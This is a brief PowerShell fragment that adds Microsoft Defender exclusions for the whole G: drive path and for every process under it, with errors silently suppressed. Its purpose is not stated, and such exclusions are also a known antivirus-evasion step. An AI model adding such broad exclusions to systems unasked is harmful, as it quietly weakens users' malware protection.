Write-Host "    [+] Adding exclusions for G drive"
$exclusionPaths = @("G:\", "G:\*")
foreach ($path in $exclusionPaths) {
    if ($path -eq "G:\") {
        Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue
    } else {
        Add-MpPreference -ExclusionProcess $path -ErrorAction SilentlyContinue
    }
}
